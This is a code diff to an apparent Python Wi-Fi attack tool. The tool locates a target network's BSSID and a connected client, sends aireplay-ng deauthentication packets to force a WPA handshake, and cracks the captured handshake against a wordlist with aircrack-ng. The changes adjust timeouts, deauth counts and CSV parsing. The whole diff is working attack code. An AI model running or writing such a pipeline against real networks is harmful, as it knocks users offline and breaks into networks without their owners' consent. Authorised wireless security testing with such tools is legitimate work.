@@ -46,7 +46,7 @@ def get_network_info(interface, target_ssid, scan_id):
         stdout=subprocess.DEVNULL,
         stderr=subprocess.DEVNULL
     )
-    time.sleep(15)
+    time.sleep(20)
     proc.terminate()
     proc.wait()
 
@@ -62,20 +62,18 @@ def get_network_info(interface, target_ssid, scan_id):
     with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f:
         lines = f.readlines()
 
-    # Parse AP section for target SSID
-    in_ap_section = True
+    # Parse CSV for target SSID
     for line in lines:
-        # Empty line separates AP section from client section
-        if line.strip() == '':
-            in_ap_section = False
-            continue
-
-        if in_ap_section and target_ssid in line:
+         if target_ssid in line:
             parts = line.split(',')
+            log(scan_id, f'Found line with {len(parts)} parts', 'info')
             if len(parts) >= 14:
                 bssid = parts[0].strip()
                 channel = parts[3].strip()
-                log(scan_id, f'Found {target_ssid} — BSSID: {bssid}, Channel: {channel}', 'success')
+                # Validate it looks like a BSSID (MAC address format)
+                if len(bssid) == 17 and ':' in bssid:
+                    log(scan_id, f'Found {target_ssid} — BSSID: {bssid}, Channel: {channel}', 'success')
+                    break
 
     # Parse client section for a connected client
     if bssid:
@@ -123,11 +121,11 @@ def run_aircrack(interface, scan_id, target_ssid=''):
         stderr=subprocess.DEVNULL
     )
 
-    time.sleep(5)
+    time.sleep(3)
 
     # Build deauth command — target specific client if found
     log(scan_id, 'Sending deauth packets to force handshake...', 'info')
-    deauth_cmd = ['sudo', 'aireplay-ng', '--deauth', '15', '-a', bssid]
+    deauth_cmd = ['sudo', 'aireplay-ng', '--deauth', '10', '-a', bssid]
     if client_mac:
         deauth_cmd += ['-c', client_mac]
     deauth_cmd.append(interface)
@@ -135,7 +133,7 @@ def run_aircrack(interface, scan_id, target_ssid=''):
     subprocess.run(deauth_cmd, capture_output=True, text=True, timeout=30)
 
     # Wait for handshake
-    time.sleep(10)
+    time.sleep(20)
     airodump.terminate()
     airodump.wait()
 
@@ -147,7 +145,7 @@ def run_aircrack(interface, scan_id, target_ssid=''):
     # Check if handshake was actually captured
     check = subprocess.run(
         ['sudo', 'aircrack-ng', cap_path],
-        capture_output=True, text=True, timeout=30
+        capture_output=True, text=True, timeout=15
     )
 
     if 'handshake' not in check.stdout.lower():
@@ -159,7 +157,7 @@ def run_aircrack(interface, scan_id, target_ssid=''):
 
     result = subprocess.run(
         ['sudo', 'aircrack-ng', '-w', wordlist, '-b', bssid, cap_path],
-        capture_output=True, text=True, timeout=120
+        capture_output=True, text=True, timeout=15
     )
 
     output = result.stdout + result.stderr
